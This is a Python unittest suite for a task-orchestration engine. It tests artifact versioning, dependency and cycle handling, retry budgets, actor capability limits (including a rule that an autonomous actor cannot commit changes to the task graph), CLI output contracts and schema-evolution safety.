"""Engine test suite (stdlib unittest; the framework stays dependency-free).

Coverage map from DESIGN.md §7: versioning · cascades (incl. cross-task
staleness) · readiness transitions · relationship integrity · cycle
detection · blocking/wake · retry budgets (derived + enforced) · capability
enforcement · verdict/signal coherence · idempotency · circuit breaker ·
config precedence · review-prompt audit · doctor · end-to-end lifecycles.

Run: python3 -m unittest discover taskforge/tests
"""
import importlib.util
import json
import os
import shutil
import tempfile
import time
import unittest
from pathlib import Path

_SCRIPT = Path(__file__).resolve().parent.parent / "scripts" / "tasks.py"
_spec = importlib.util.spec_from_file_location("tasks", _SCRIPT)
tasks = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(tasks)

# The engine's storage module (loaded when tasks.py imported it) — for the
# lock constants/helpers, which the stable facade intentionally does not
# re-export.
import sys  # noqa: E402
store = sys.modules["engine.store"]


def spec_payload(scope="do it", criteria=None, adopted=False):
    return {"scope": scope,
            "acceptance_criteria": criteria or ["it works", "tests pass"],
            "adopted_from_source": adopted}


def decision_payload(approach="A"):
    return {"chosen_approach": approach, "rationale": "because"}


def impl_payload(summary="did the thing", diff_ref="branch:x"):
    return {"summary": summary, "diff_ref": diff_ref,
            "test_results": {"passed": 3, "failed": 0, "summary": "green"}}


def review_payload(verdict="approved", root_cause=None, findings=None):
    p = {"verdict": verdict, "findings": findings or []}
    if root_cause:
        p["root_cause"] = root_cause
    return p


class Base(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp(prefix="taskforge-test-")
        os.environ["TASKFORGE_DIR"] = self.dir
        os.environ.pop("TASKFORGE_MAX_REVIEW_RETRIES", None)
        os.environ.pop("TASKFORGE_MAX_VERSIONS", None)

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)
        os.environ.pop("TASKFORGE_DIR", None)

    def make(self, title="t", desc="d"):
        t = tasks.new_task(title, desc)
        tasks.record(t, "created", "taskforge")
        tasks.refresh_status(t)
        tasks.save(t)
        return t

    def apply(self, task, result, actor):
        return tasks.apply_result(task, result, actor)

    def reload(self, task):
        return tasks.load(task["id"])


class TestVersioning(Base):
    def test_versions_supersession_and_reason_placement(self):
        t = self.make()
        self.apply(t, {"artifacts": [
            {"kind": "specification", "payload": spec_payload("v1")}]},
            "refine")
        self.apply(t, {"artifacts": [
            {"kind": "specification", "payload": spec_payload("v2"),
             "supersedes_reason": "rewritten"}]}, "refine")
        t = self.reload(t)
        self.assertEqual(tasks.active(t, "specification")["version"], 2)
        v1 = t["artifacts"]["specification"][0]
        self.assertTrue(v1["superseded"])
        self.assertEqual(v1["superseded_reason"], "rewritten")

    def test_supersede_first_reason_wins(self):
        art = {"superseded": False, "superseded_reason": None,
               "superseded_at": None}
        tasks.supersede(art, "first")
        tasks.supersede(art, "second")
        self.assertEqual(art["superseded_reason"], "first")

    def test_circuit_breaker_parks_at_max_versions(self):
        t = self.make()
        for i in range(4):
            t = self.reload(t)
            self.apply(t, {"artifacts": [{
                "kind": "specification",
                "payload": spec_payload(f"v{i}")}]}, "refine")
        t = self.reload(t)
        self.assertEqual(t["status"], "blocked_on_human")


class TestCascades(Base):
    def test_decision_supersession_cascades_and_reroutes(self):
        t = self.make()
        self.apply(t, {"artifacts": [
            {"kind": "decision", "payload": decision_payload("A")}]},
            "explore")
        t = self.reload(t)
        self.apply(t, {"artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}, "refine")
        t = self.reload(t)
        self.apply(t, {"artifacts": [
            {"kind": "decision", "payload": decision_payload("B"),
             "supersedes_reason": "A wrong"}]}, "explore")
        t = self.reload(t)
        self.assertIsNone(tasks.active(t, "specification"))
        self.assertEqual(tasks.evaluate(t)["readiness"], "refine")

    def test_cross_task_decision_ref_staleness(self):
        parent = self.make("parent")
        self.apply(parent, {"artifacts": [
            {"kind": "decision", "payload": decision_payload("v1")}]},
            "explore")
        parent = self.reload(parent)
        # Topology (children) is the human's to commit, not explore's; the
        # decision above is explore's content. Mechanics below are unchanged.
        r = self.apply(parent, {"generated_tasks": [
            {"title": "kid", "description": "d", "relation": "child"}]},
            "human")
        kid_id = r["generated_tasks"][0]
        kid = tasks.load(kid_id)
        self.assertEqual(kid["decision_ref"]["version"], 1)
        self.apply(kid, {"artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}, "refine")
        parent = self.reload(parent)
        self.apply(parent, {"artifacts": [
            {"kind": "decision", "payload": decision_payload("v2"),
             "supersedes_reason": "re-explored"}]}, "explore")
        kid = tasks.load(kid_id)
        self.assertIsNone(tasks.active(kid, "specification"))
        self.assertTrue(any(e["type"] == "stale_decision_ref"
                            for e in kid["history"]))
        self.assertEqual(tasks.evaluate(kid)["readiness"], "refine")


class TestReadiness(Base):
    def test_rule_table(self):
        t = self.make()
        self.assertEqual(tasks.evaluate(t)["readiness"], "refine")
        self.apply(t, {"artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}, "refine")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "run")
        t["status"] = "done"
        self.assertEqual(tasks.evaluate(t)["readiness"], "terminal")

    def test_pending_escalation_beats_refine(self):
        t = self.make()
        self.apply(t, {"signal": "escalate_explore",
                       "signal_reason": "undecided"}, "refine")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "explore")
        self.apply(t, {"artifacts": [
            {"kind": "decision", "payload": decision_payload()}]}, "explore")
        t = self.reload(t)
        self.assertIsNone(t["pending_escalation"])
        self.assertEqual(tasks.evaluate(t)["readiness"], "refine")

    def test_blocked_on_human_blocker_does_not_release(self):
        blocker, t = self.make("b"), self.make("t")
        self.apply(t, {"edges": [
            {"type": "blocked_by", "target": blocker["id"]}]}, "human")
        blocker = self.reload(blocker)
        blocker["status"] = "blocked_on_human"
        tasks.save(blocker)
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "waiting")

    def test_dangling_blocker_waits(self):
        t = self.make()
        t["edges"].append({"type": "blocked_by", "target": "TASK-ghost1234567",
                           "created_at": tasks.now(), "reason": None})
        self.assertEqual(tasks.evaluate(t)["readiness"], "waiting")


class TestRelationships(Base):
    def test_inverse_edges_rejected_with_pointer(self):
        for bad, canonical in (("blocks", "blocked_by"),
                               ("children", "parent"),
                               ("depends_on", "blocked_by")):
            with self.assertRaises(tasks.TaskforgeError) as cm:
                tasks.validate_edge_type(bad)
            self.assertIn(canonical, str(cm.exception))

    def test_relation_wiring(self):
        t = self.make()
        r = self.apply(t, {"generated_tasks": [
            {"title": "f", "description": "d", "relation": "follow_up"},
            {"title": "p", "description": "d", "relation": "prerequisite",
             "reason": "need it"}]}, "refine")
        t = self.reload(t)
        fu, pre = (tasks.load(i) for i in r["generated_tasks"])
        self.assertTrue(tasks.has_edge(fu, "generated_from", t["id"]))
        self.assertFalse(tasks.has_edge(t, "blocked_by", fu["id"]))
        self.assertTrue(tasks.has_edge(t, "blocked_by", pre["id"]))
        self.assertEqual(fu["source"]["type"], "internal")
        self.assertEqual(tasks.evaluate(t)["readiness"], "waiting")

    def test_edges_idempotent_and_no_self_edges(self):
        a, b = self.make("a"), self.make("b")
        for _ in range(2):
            a = self.reload(a)
            self.apply(a, {"edges": [
                {"type": "relates_to", "target": b["id"]}]}, "human")
        a = self.reload(a)
        self.assertEqual(
            len([e for e in a["edges"] if e["type"] == "relates_to"]), 1)
        with self.assertRaises(tasks.TaskforgeError):
            tasks.validate_result(
                {"edges": [{"type": "relates_to", "target": a["id"]}]},
                "human", a)


class TestCycles(Base):
    def _block(self, x, y):
        x = self.reload(x)
        self.apply(x, {"edges": [{"type": "blocked_by", "target": y["id"]}]},
                   "human")

    def test_direct_and_transitive_cycles(self):
        a, b, c = self.make("a"), self.make("b"), self.make("c")
        self._block(a, b)
        self._block(b, c)
        self._block(c, a)
        ev = tasks.evaluate(self.reload(a))
        self.assertEqual(ev["readiness"], "human")
        self.assertIn(a["id"], ev["cycle"])

    def test_diamond_is_not_a_cycle(self):
        a, b, c, d = (self.make(x) for x in "abcd")
        self._block(a, b)
        self._block(a, c)
        self._block(b, d)
        self._block(c, d)
        self.assertEqual(tasks.evaluate(self.reload(a))["readiness"],
                         "waiting")


class TestBlockingAndWake(Base):
    def test_done_wakes_waiters_cancel_too(self):
        t = self.make()
        r = self.apply(t, {"generated_tasks": [
            {"title": "p", "description": "d", "relation": "prerequisite",
             "reason": "need"}]}, "refine")
        pre = tasks.load(r["generated_tasks"][0])
        self.apply(pre, {"signal": "done"}, "human")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "refine")
        self.assertTrue(any(e["type"] == "unblocked" for e in t["history"]))


class TestBudgets(Base):
    def _reject(self, t):
        t = self.reload(t)
        return self.apply(t, {"artifacts": [
            {"kind": "implementation", "payload": impl_payload()},
            {"kind": "review",
             "payload": review_payload("rejected", "implementation",
                                       ["bad"])}]}, "run")

    def test_derivation_and_engine_enforcement(self):
        t = self.make()
        self.apply(t, {"artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}, "refine")
        self._reject(t)
        self._reject(t)
        t = self.reload(t)
        self.assertEqual(tasks.review_rejections_in_current_cycle(t), 2)
        self.assertNotEqual(t["status"], "blocked_on_human")
        self._reject(t)  # third rejection exceeds 2 retries -> engine parks
        t = self.reload(t)
        self.assertEqual(t["status"], "blocked_on_human")
        blocked = [e for e in t["history"] if e["type"] == "human_blocked"]
        self.assertIn("budget", blocked[-1]["reason"])
        self.assertEqual(blocked[-1]["detail"].get("enforced_by"), "engine")

    def test_human_update_resets_cycle_and_resumes(self):
        t = self.make()
        tasks.record(t, "review_rejected", "run")
        tasks.record(t, "human_updated", "human")
        self.assertEqual(tasks.review_rejections_in_current_cycle(t), 0)


class TestCapabilities(Base):
    def test_actor_artifact_restriction(self):
        t = self.make()
        with self.assertRaises(tasks.TaskforgeError):
            tasks.validate_result({"artifacts": [
                {"kind": "implementation", "payload": impl_payload()}]},
                "refine", t)

    def test_actor_signal_and_relation_restrictions(self):
        t = self.make()
        with self.assertRaises(tasks.TaskforgeError):
            tasks.validate_result(
                {"signal": "done"}, "explore", t)
        with self.assertRaises(tasks.TaskforgeError):
            tasks.validate_result({"generated_tasks": [
                {"title": "x", "description": "y", "relation": "child"}]},
                "run", t)

    def test_unknown_actor_denied(self):
        with self.assertRaises(tasks.TaskforgeError) as cm:
            tasks.validate_result({}, "rogue")
        self.assertIn("capabilities.json", str(cm.exception))

    def test_terminal_tasks_writable_only_by_human(self):
        t = self.make()
        t["status"] = "done"
        tasks.save(t)
        with self.assertRaises(tasks.TaskforgeError):
            tasks.validate_result({"notes": "late"}, "run", self.reload(t))


class TestCoherence(Base):
    def test_done_requires_approved_review(self):
        t = self.make()
        with self.assertRaises(tasks.TaskforgeError) as cm:
            tasks.validate_result({"artifacts": [
                {"kind": "implementation", "payload": impl_payload()},
                {"kind": "review",
                 "payload": review_payload("rejected", "implementation")}],
                "signal": "done"}, "run", t)
        self.assertIn("approved", str(cm.exception))

    def test_rejected_review_requires_root_cause(self):
        with self.assertRaises(tasks.TaskforgeError):
            tasks.validate_payload("review", {"verdict": "rejected"})

    def test_escalations_require_reason(self):
        with self.assertRaises(tasks.TaskforgeError):
            tasks.validate_result({"signal": "escalate_explore"}, "refine")


class TestIdempotency(Base):
    def test_duplicate_result_id_is_noop(self):
        t = self.make()
        result = {"result_id": "r-1", "artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}
        self.apply(t, result, "refine")
        r2 = self.apply(self.reload(t), result, "refine")
        self.assertFalse(r2["applied"])
        t = self.reload(t)
        self.assertEqual(len(t["artifacts"]["specification"]), 1)

    def test_missing_result_id_warns(self):
        warnings = tasks.validate_result({}, "human")
        self.assertTrue(any("result_id" in w for w in warnings))


class TestEscalationSemantics(Base):
    def test_escalate_refine_supersedes_spec(self):
        t = self.make()
        self.apply(t, {"artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}, "refine")
        t = self.reload(t)
        self.apply(t, {"signal": "escalate_refine",
                       "signal_reason": "ambiguous"}, "run")
        t = self.reload(t)
        self.assertIsNone(tasks.active(t, "specification"))
        self.assertEqual(tasks.evaluate(t)["readiness"], "refine")

    def test_child_architecture_escalation_reaches_parent(self):
        parent = self.make("parent")
        self.apply(parent, {"artifacts": [
            {"kind": "decision", "payload": decision_payload()}]}, "explore")
        parent = self.reload(parent)
        # Topology (children) is the human's to commit, not explore's; the
        # decision above is explore's content. Mechanics below are unchanged.
        r = self.apply(parent, {"generated_tasks": [
            {"title": "kid", "description": "d", "relation": "child"}]},
            "human")
        kid = tasks.load(r["generated_tasks"][0])
        self.apply(kid, {"signal": "escalate_explore",
                         "signal_reason": "cannot work"}, "run")
        parent = self.reload(parent)
        self.assertEqual(parent["pending_escalation"], "explore")


class TestConfig(Base):
    def test_env_overrides_file(self):
        tasks.ensure_config_file()
        os.environ["TASKFORGE_MAX_REVIEW_RETRIES"] = "5"
        try:
            self.assertEqual(tasks.config()["max_review_retries"], 5)
        finally:
            del os.environ["TASKFORGE_MAX_REVIEW_RETRIES"]
        self.assertEqual(tasks.config()["max_review_retries"], 2)


class TestReviewAudit(Base):
    def _runnable(self):
        t = self.make()
        self.apply(t, {"artifacts": [
            {"kind": "specification",
             "payload": spec_payload(criteria=["criterion alpha",
                                               "criterion beta"])}]},
            "refine")
        return self.reload(t)

    def test_clean_audit(self):
        t = self._runnable()
        prompt = ("Spec criteria: criterion alpha; criterion beta.\n"
                  "Diff: +change\nTests: green")
        self.apply(t, {"artifacts": [
            {"kind": "implementation",
             "payload": impl_payload(summary="SECRET_REASONING_XYZ")}]},
            "run")
        tasks.record_review_prompt(t["id"], 1, prompt)
        t = self.reload(t)
        self.apply(t, {"artifacts": [
            {"kind": "review", "payload": review_payload()}]}, "run")
        report = tasks.audit_review(t["id"])
        self.assertTrue(report["clean"], report["findings"])

    def test_leak_and_missing_criterion_detected(self):
        t = self._runnable()
        self.apply(t, {"artifacts": [
            {"kind": "implementation",
             "payload": impl_payload(summary="SECRET_REASONING_XYZ")}]},
            "run")
        bad_prompt = ("criterion alpha only. My approach: "
                      "SECRET_REASONING_XYZ")
        tasks.record_review_prompt(t["id"], 1, bad_prompt)
        t = self.reload(t)
        self.apply(t, {"artifacts": [
            {"kind": "review", "payload": review_payload()}]}, "run")
        report = tasks.audit_review(t["id"])
        self.assertFalse(report["clean"])
        text = " ".join(report["findings"])
        self.assertIn("criterion beta", text)      # missing criterion
        self.assertIn("leaked", text)              # isolation violation

    def test_unrecorded_review_flagged(self):
        t = self._runnable()
        self.apply(t, {"artifacts": [
            {"kind": "implementation", "payload": impl_payload()},
            {"kind": "review", "payload": review_payload()}]}, "run")
        report = tasks.audit_review(t["id"])
        self.assertFalse(report["clean"])
        self.assertIn("no recorded prompt", report["findings"][0])


class TestDoctor(Base):
    def test_findings(self):
        t = self.make()
        t["edges"].append({"type": "blocked_by", "target": "TASK-ghost123456",
                           "created_at": tasks.now(), "reason": None})
        tasks.save(t)
        report = tasks.doctor()
        self.assertFalse(report["clean"])
        self.assertTrue(any("dangling" in f for f in report["findings"]))


class TestLifecycles(Base):
    """End-to-end flows through apply_result only — the integration layer."""

    def test_adopt_run_done_wake(self):
        dep = self.make("dependent")
        t = self.make("main")
        self.apply(dep, {"edges": [
            {"type": "blocked_by", "target": t["id"]}]}, "human")
        self.apply(t, {"result_id": "r1", "artifacts": [
            {"kind": "specification",
             "payload": spec_payload(adopted=True)}]}, "refine")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "run")
        self.apply(t, {"result_id": "r2", "artifacts": [
            {"kind": "implementation", "payload": impl_payload()},
            {"kind": "review", "payload": review_payload()}],
            "signal": "done",
            "signal_reason": None,
            "notes": "approved v1"}, "run")
        t, dep = self.reload(t), self.reload(dep)
        self.assertEqual(t["status"], "done")
        self.assertEqual(tasks.evaluate(dep)["readiness"], "refine")

    def test_escalate_decide_decompose_complete(self):
        t = self.make("big feature")
        self.apply(t, {"signal": "escalate_explore",
                       "signal_reason": "undecided"}, "refine")
        t = self.reload(t)
        # Explore commits the decision (content); the human commits the
        # decomposition (topology) — the two-step realization of the invariant.
        self.apply(t, {"artifacts": [
            {"kind": "decision", "payload": decision_payload()}]}, "explore")
        t = self.reload(t)
        r = self.apply(t, {"generated_tasks": [
            {"title": "A", "description": "a", "relation": "child"},
            {"title": "B", "description": "b", "relation": "child"}]}, "human")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "waiting")
        for kid_id in r["generated_tasks"]:
            kid = tasks.load(kid_id)
            self.assertEqual(kid["decision_ref"]["task_id"], t["id"])
            self.apply(kid, {"artifacts": [
                {"kind": "specification", "payload": spec_payload()}]},
                "refine")
            kid = tasks.load(kid_id)
            self.apply(kid, {"artifacts": [
                {"kind": "implementation", "payload": impl_payload()},
                {"kind": "review", "payload": review_payload()}],
                "signal": "done"}, "run")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "refine")

    def test_clarify_block_answer_resume(self):
        t = self.make()
        r = self.apply(t, {"generated_tasks": [
            {"title": "which regions?", "description": "product must decide",
             "relation": "prerequisite", "reason": "cannot spec"}]},
            "refine")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "waiting")
        clar = tasks.load(r["generated_tasks"][0])
        self.apply(clar, {"signal": "done"}, "human")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "refine")

    def test_park_then_human_update_resumes(self):
        t = self.make()
        self.apply(t, {"signal": "block_on_human",
                       "signal_reason": "conflicting requirements"}, "refine")
        t = self.reload(t)
        self.assertEqual(t["status"], "blocked_on_human")
        t["status"] = "new"
        tasks.record(t, "human_updated", "human", reason="resolved: option B")
        tasks.apply_result(t, {"artifacts": [
            {"kind": "specification", "payload": spec_payload("option B")}]},
            "human")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "run")


if __name__ == "__main__":
    unittest.main()


class TestHumanExemption(Base):
    def test_human_may_close_reviewless_task_but_run_may_not(self):
        t = self.make()
        # run cannot declare done without an approved review:
        with self.assertRaises(tasks.TaskforgeError):
            tasks.validate_result({"signal": "done"}, "run", t)
        # human can (clarification-style closure), and it's on the record:
        self.apply(t, {"signal": "done"}, "human")
        t = self.reload(t)
        self.assertEqual(t["status"], "done")
        self.assertEqual(t["history"][-1]["actor"], "human")


class TestRetryAfterTerminal(Base):
    def test_duplicate_result_id_is_noop_even_on_terminal_task(self):
        t = self.make()
        self.apply(t, {"result_id": "s1", "artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}, "refine")
        t = self.reload(t)
        result = {"result_id": "d1", "artifacts": [
            {"kind": "implementation", "payload": impl_payload()},
            {"kind": "review", "payload": review_payload()}],
            "signal": "done"}
        self.apply(t, result, "run")          # makes the task terminal
        r2 = self.apply(self.reload(t), result, "run")   # retry-after-timeout
        self.assertFalse(r2["applied"])
        self.assertEqual(r2["duplicate_of"], "d1")


# The frozen public output keys (docs/PUBLIC_API.md). A doc-contract guard
# cross-checks this set against the document so declaration and enforcement
# cannot silently diverge. Kept as a simple literal for that regex.
PUBLIC_OUTPUT_KEYS = {
    "id", "readiness", "next_review_version", "status",
    "generated_tasks", "clean", "warnings",
}
READINESS_VOCAB = {"refine", "explore", "run", "waiting", "terminal", "human"}


class TestPublicOutputContract(Base):
    """Enforces the stable CLI surface declared in docs/PUBLIC_API.md.

    These assert the PRESENCE and TYPE of frozen keys and are tolerant of any
    additional keys — an internal implementation detail may be added without
    breaking the suite, while removing/renaming a frozen key or changing the
    routing vocabulary fails loudly. This tests the contract, not the JSON."""

    def cli(self, argv):
        import io
        import contextlib
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            tasks.main(argv)
        return json.loads(buf.getvalue())

    def cli_status(self, argv):
        """Return (exit_code, stderr_json_or_None) for a failing command."""
        import io
        import contextlib
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            with self.assertRaises(SystemExit) as ctx:
                tasks.main(argv)
        raw = err.getvalue()
        try:
            payload = json.loads(raw)
        except (ValueError, json.JSONDecodeError):
            payload = None
        return ctx.exception.code, payload

    def specced_task(self):
        t = self.make()
        self.cli(["apply", "--actor", "refine", *self._spec_result(t["id"])])
        return t

    def _spec_result(self, task_id):
        p = Path(self.dir) / "r.json"
        p.write_text(json.dumps({"result_id": "s", "artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}))
        # apply's argv order is: apply <id> <result_json>
        return [task_id, str(p)]

    # --- frozen output keys ------------------------------------------------

    def test_readiness_value_is_a_routing_string(self):
        t = self.make()
        out = self.cli(["readiness", t["id"]])
        self.assertIn("readiness", out)
        self.assertIsInstance(out["readiness"], str)
        self.assertIn(out["readiness"], READINESS_VOCAB)

    def test_list_rows_carry_id_and_readiness(self):
        self.make()
        rows = self.cli(["list"])
        self.assertIsInstance(rows, list)
        for row in rows:
            self.assertIn("id", row)
            self.assertIn("readiness", row)
            self.assertIn(row["readiness"], READINESS_VOCAB)

    def test_budget_next_review_version_is_int(self):
        t = self.specced_task()
        out = self.cli(["budget", t["id"]])
        self.assertIsInstance(out["next_review_version"], int)
        self.assertGreaterEqual(out["next_review_version"], 1)

    def test_apply_return_status_readiness_generated(self):
        t = self.make()
        result = self.apply(t, {"result_id": "x", "generated_tasks": [
            {"title": "f", "description": "d", "relation": "follow_up",
             "reason": "r"}]}, "refine")
        self.assertIn("status", result)
        self.assertIsInstance(result["readiness"], str)  # routing string
        self.assertIn(result["readiness"], READINESS_VOCAB)
        self.assertIsInstance(result["generated_tasks"], list)

    def test_blocked_by_is_array_of_ids(self):
        a, b = self.make("a"), self.make("b")
        self.apply(b, {"edges": [
            {"type": "blocked_by", "target": a["id"]}]}, "human")
        out = self.cli(["blocked-by", a["id"]])
        self.assertIsInstance(out, list)
        self.assertIn(b["id"], out)

    def test_doctor_clean_is_bool(self):
        out = self.cli(["doctor"])
        self.assertIsInstance(out["clean"], bool)

    def test_validate_has_warnings_and_no_valid_key(self):
        t = self.make()
        rp = Path(self.dir) / "v.json"
        rp.write_text(json.dumps({"artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}))
        out = self.cli(["validate", str(rp), "--actor", "refine",
                        "--task", t["id"]])
        self.assertIn("warnings", out)
        self.assertIsInstance(out["warnings"], list)
        self.assertNotIn("valid", out)  # removed pre-1.0

    # --- exit-code semantics ----------------------------------------------

    def test_invalid_validate_exits_1_with_error_on_stderr(self):
        rp = Path(self.dir) / "bad.json"
        rp.write_text(json.dumps({"artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}))
        code, payload = self.cli_status(
            ["validate", str(rp), "--actor", "rogue-actor"])
        self.assertEqual(code, 1)
        self.assertIn("error", payload)

    def test_readiness_value_vocabulary_is_complete(self):
        # Every value evaluate() can emit must be in the declared vocabulary.
        # (Guards against a new routing state added without documenting it.)
        emitted = set()
        # refine (fresh), run (spec present), terminal (done):
        t = self.make()
        emitted.add(self.cli(["readiness", t["id"]])["readiness"])
        t2 = self.specced_task()
        emitted.add(self.cli(["readiness", t2["id"]])["readiness"])
        self.assertTrue(emitted <= READINESS_VOCAB)

    # --- tolerance: extra keys never break the contract -------------------

    def test_extra_keys_are_tolerated(self):
        # The contract is presence, not equality: create returns convenience
        # keys (title/source/...) that are NOT frozen and must not be asserted.
        out = self.cli(["create", "--title", "t", "--description", "d"])
        self.assertIn("readiness", out)          # frozen
        self.assertIn(out["readiness"], READINESS_VOCAB)
        # Non-frozen keys may exist; we neither require nor forbid them.


class TestTopologyInvariant(Base):
    """Explore may autonomously change a task's *contents* (its decision) but
    not the *topology* of the work graph (child tasks, backlog tasks,
    dependency edges). Topology is engine-gated by capabilities; the human
    commits it. The load-bearing property: an autonomous actor cannot
    restructure the graph."""

    def spec_result(self):
        return {"artifacts": [{"kind": "specification",
                               "payload": spec_payload()}]}

    def decision_result(self):
        return {"artifacts": [{"kind": "decision",
                               "payload": decision_payload()}]}

    # --- explore may commit content ---------------------------------------

    def test_explore_may_record_a_self_contained_decision(self):
        t = self.make()
        self.apply(t, {"signal": "escalate_explore",
                       "signal_reason": "fork"}, "refine")
        t = self.reload(t)
        self.apply(t, self.decision_result(), "explore")   # content, allowed
        t = self.reload(t)
        self.assertIsNotNone(tasks.active(t, "decision"))
        self.assertEqual(tasks.evaluate(t)["readiness"], "refine")  # routes on

    def test_explore_may_propose_topology_via_block(self):
        # The real flow: record the decision AND park for topology approval,
        # in one result. The decision commits; nothing topological does.
        t = self.make()
        r = self.apply(t, {
            "artifacts": [{"kind": "decision",
                           "payload": decision_payload()}],
            "signal": "block_on_human",
            "signal_reason": "proposing 2 children + 1 finding for approval"},
            "explore")
        t = self.reload(t)
        self.assertIsNotNone(tasks.active(t, "decision"))   # content committed
        self.assertEqual(t["status"], "blocked_on_human")   # topology parked

    # --- explore may NOT commit topology (the invariant) ------------------

    def test_explore_cannot_create_children(self):
        t = self.make()
        with self.assertRaises(tasks.TaskforgeError) as ctx:
            self.apply(t, {"generated_tasks": [
                {"title": "c", "description": "d", "relation": "child"}]},
                "explore")
        self.assertIn("may not generate 'child'", str(ctx.exception))

    def test_explore_cannot_create_follow_up_backlog(self):
        t = self.make()
        with self.assertRaises(tasks.TaskforgeError):
            self.apply(t, {"generated_tasks": [
                {"title": "f", "description": "d", "relation": "follow_up"}]},
                "explore")

    def test_explore_cannot_add_a_dependency_edge(self):
        blocker = self.make("blocker")
        t = self.make("t")
        with self.assertRaises(tasks.TaskforgeError) as ctx:
            self.apply(t, {"edges": [
                {"type": "blocked_by", "target": blocker["id"]}]}, "explore")
        self.assertIn("topology", str(ctx.exception))

    def test_explore_may_add_an_annotation_edge(self):
        # Annotation edges are metadata, not topology — ungated.
        other = self.make("other")
        t = self.make("t")
        self.apply(t, {"edges": [
            {"type": "relates_to", "target": other["id"]}]}, "explore")
        self.assertTrue(tasks.has_edge(self.reload(t), "relates_to",
                                       other["id"]))

    # --- the human commits topology; taskforge intake unaffected ----------

    def test_human_commits_the_approved_topology(self):
        t = self.make()
        self.apply(t, self.decision_result(), "explore")   # decision content
        t = self.reload(t)
        r = self.apply(t, {"generated_tasks": [   # approval → human commits
            {"title": "child", "description": "d", "relation": "child"}]},
            "human")
        kid = tasks.load(r["generated_tasks"][0])
        self.assertEqual(kid["decision_ref"]["task_id"], t["id"])  # pinned
        self.assertEqual(tasks.evaluate(self.reload(t))["readiness"], "waiting")

    def test_taskforge_intake_may_still_wire_a_blocked_by_edge(self):
        dep = self.make("dep")
        t = self.make("t")
        self.apply(t, {"edges": [
            {"type": "blocked_by", "target": dep["id"]}]}, "taskforge")
        self.assertTrue(tasks.has_edge(self.reload(t), "blocked_by",
                                       dep["id"]))


class TestSchemaEvolution(Base):
    """Directional compatibility (DESIGN §10.12): an engine reads/migrates
    OLDER data but never interprets, mutates, or routes on NEWER data. The
    load-bearing invariant is that a current engine never mutates the bytes
    of a future-schema task; every other behavior follows from it."""

    def write_future_task(self, task_id="TASK-future0001", schema=2,
                          edges=None, status="needs_refine"):
        t = {
            "schema_version": schema, "id": task_id,
            "title": "from the future",
            "description": "written by a newer engine", "status": status,
            "created_at": "2099-01-01T00:00:00+00:00",
            "updated_at": "2099-01-01T00:00:00+00:00",
            "source": {"type": "internal", "reference": None,
                       "synced_at": None},
            "edges": edges or [], "decision_ref": None,
            "pending_escalation": None, "applied_results": [],
            "artifacts": {k: [] for k in tasks.KINDS}, "history": [],
            "unknown_v2_field": "the engine must not choke on or drop this",
        }
        p = Path(self.dir) / f"{task_id}.json"
        p.write_text(json.dumps(t, indent=2, sort_keys=True))
        return p

    def cli_exit(self, argv):
        import io
        import contextlib
        with contextlib.redirect_stderr(io.StringIO()):
            with self.assertRaises(SystemExit) as ctx:
                tasks.main(argv)
        return ctx.exception.code

    # --- the load-bearing invariant ---------------------------------------

    def test_current_engine_never_mutates_future_task_bytes(self):
        # A future-schema task that is a DEPENDENT of a current task — the
        # exact setup where a cross-task cascade (refresh_dependents) would,
        # pre-fix, refresh_status + save it and rewrite it as v1.
        blocker = self.make("blocker")
        fp = self.write_future_task(edges=[{"type": "blocked_by",
                                            "target": blocker["id"],
                                            "created_at": tasks.now(),
                                            "reason": None}])
        before = fp.read_bytes()

        # Close the blocker → triggers refresh_dependents over the whole store.
        self.apply(blocker, {"signal": "done", "signal_reason": "x"}, "human")

        self.assertEqual(fp.read_bytes(), before,
                         "a current engine rewrote a future-schema task")

    # --- single-task access fails closed ----------------------------------

    def test_single_task_access_is_refused(self):
        self.write_future_task()
        with self.assertRaises(tasks.TaskforgeError):
            tasks.load("TASK-future0001")
        self.assertEqual(self.cli_exit(["show", "TASK-future0001"]), 1)
        self.assertEqual(self.cli_exit(["readiness", "TASK-future0001"]), 1)

    # --- store-wide scans skip future-schema tasks ------------------------

    def test_all_tasks_skips_future(self):
        self.make("current")
        self.write_future_task()
        ids = [t["id"] for t in tasks.all_tasks()]
        self.assertNotIn("TASK-future0001", ids)

    def test_list_and_blocked_by_exclude_future(self):
        import io
        import contextlib
        cur = self.make("current")
        self.write_future_task(edges=[{"type": "blocked_by",
                                       "target": cur["id"],
                                       "created_at": tasks.now(),
                                       "reason": None}])
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            tasks.main(["list"])
        listed = [r["id"] for r in json.loads(buf.getvalue())]
        self.assertNotIn("TASK-future0001", listed)

        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            tasks.main(["blocked-by", cur["id"]])
        self.assertNotIn("TASK-future0001", json.loads(buf.getvalue()))

    def test_current_task_blocked_by_future_routes_to_waiting(self):
        self.write_future_task(task_id="TASK-future0001")
        y = self.make("dependent")
        self.apply(y, {"edges": [{"type": "blocked_by",
                                  "target": "TASK-future0001"}]}, "human")
